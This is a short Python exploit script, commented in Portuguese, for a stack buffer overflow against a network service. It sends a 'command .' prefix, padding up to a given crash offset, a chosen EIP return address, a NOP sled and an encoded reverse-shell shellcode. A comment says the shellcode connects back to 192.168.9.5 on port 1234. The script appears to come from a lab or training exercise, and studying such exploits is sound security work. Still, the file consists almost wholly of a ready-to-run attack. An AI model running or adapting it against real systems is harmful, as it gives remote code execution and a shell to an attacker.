#!/usr/bin/python

import argparse
import socket
from struct import pack

# Configurar o argparse
parser = argparse.ArgumentParser(description="Enviar padrão com o offset já encontrado para verificar os bytes correspondentes ao EIP")
parser.add_argument("client_ip", type=str, help="O endereço IP do cliente")
parser.add_argument("client_port", type=int, help="A porta do cliente")
parser.add_argument("offset", type=int, help="Offset de Crash")
parser.add_argument("eip_alvo", type=str, help="EIP Alvo (Ex: 0x080414c3)")


# Analisar os argumentos
args = parser.parse_args()

# Endereço de Memória para EIP Alvo
eip_int = int(args.eip_alvo,16)
eip = pack('<I', eip_int)

# Reverse Shell - 192.168.9.5 1234
# Badchars \x00
revshell = ( 
    b""
    b"\xdb\xd6\xbf\xce\x4c\x0e\x95\xd9\x74\x24\xf4\x5b\x31"
    b"\xc9\xb1\x52\x31\x7b\x17\x03\x7b\x17\x83\x0d\x48\xec"
    b"\x60\x6d\xb9\x72\x8a\x8d\x3a\x13\x02\x68\x0b\x13\x70"
    b"\xf9\x3c\xa3\xf2\xaf\xb0\x48\x56\x5b\x42\x3c\x7f\x6c"
    b"\xe3\x8b\x59\x43\xf4\xa0\x9a\xc2\x76\xbb\xce\x24\x46"
    b"\x74\x03\x25\x8f\x69\xee\x77\x58\xe5\x5d\x67\xed\xb3"
    b"\x5d\x0c\xbd\x52\xe6\xf1\x76\x54\xc7\xa4\x0d\x0f\xc7"
    b"\x47\xc1\x3b\x4e\x5f\x06\x01\x18\xd4\xfc\xfd\x9b\x3c"
    b"\xcd\xfe\x30\x01\xe1\x0c\x48\x46\xc6\xee\x3f\xbe\x34"
    b"\x92\x47\x05\x46\x48\xcd\x9d\xe0\x1b\x75\x79\x10\xcf"
    b"\xe0\x0a\x1e\xa4\x67\x54\x03\x3b\xab\xef\x3f\xb0\x4a"
    b"\x3f\xb6\x82\x68\x9b\x92\x51\x10\xba\x7e\x37\x2d\xdc"
    b"\x20\xe8\x8b\x97\xcd\xfd\xa1\xfa\x99\x32\x88\x04\x5a"
    b"\x5d\x9b\x77\x68\xc2\x37\x1f\xc0\x8b\x91\xd8\x27\xa6"
    b"\x66\x76\xd6\x49\x97\x5f\x1d\x1d\xc7\xf7\xb4\x1e\x8c"
    b"\x07\x38\xcb\x03\x57\x96\xa4\xe3\x07\x56\x15\x8c\x4d"
    b"\x59\x4a\xac\x6e\xb3\xe3\x47\x95\x54\xcc\x30\x9c\xa1"
    b"\xa4\x42\x9e\xad\xe6\xca\x78\xc7\x16\x9b\xd3\x70\x8e"
    b"\x86\xaf\xe1\x4f\x1d\xca\x22\xdb\x92\x2b\xec\x2c\xde"
    b"\x3f\x99\xdc\x95\x1d\x0c\xe2\x03\x09\xd2\x71\xc8\xc9"
    b"\x9d\x69\x47\x9e\xca\x5c\x9e\x4a\xe7\xc7\x08\x68\xfa"
    b"\x9e\x73\x28\x21\x63\x7d\xb1\xa4\xdf\x59\xa1\x70\xdf"
    b"\xe5\x95\x2c\xb6\xb3\x43\x8b\x60\x72\x3d\x45\xde\xdc"
    b"\xa9\x10\x2c\xdf\xaf\x1c\x79\xa9\x4f\xac\xd4\xec\x70"
    b"\x01\xb1\xf8\x09\x7f\x21\x06\xc0\x3b\x41\xe5\xc0\x31"
    b"\xea\xb0\x81\xfb\x77\x43\x7c\x3f\x8e\xc0\x74\xc0\x75"
    b"\xd8\xfd\xc5\x32\x5e\xee\xb7\x2b\x0b\x10\x6b\x4b\x1e"
    )

    
# Variáveis de entrada
client_ip = args.client_ip
client_port = args.client_port
offset = args.offset
payload = b"command "
payload += b"." 
payload += b"A"*offset
payload += eip
payload += b"\x90" * 32 # NOPs 
payload += revshell


try:
    # Cria conexão e envia o payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((client_ip, client_port))
    print("[+] Enviando Buffer de {} 'A', EIP: {} e Shellcode de {} bytes [+]\n".format(str(offset), str(eip), len(revshell)))
    client.send(payload)
    client.recv(1024)
    client.close()
    
except ConnectionResetError:
    print(f"Reset Error!")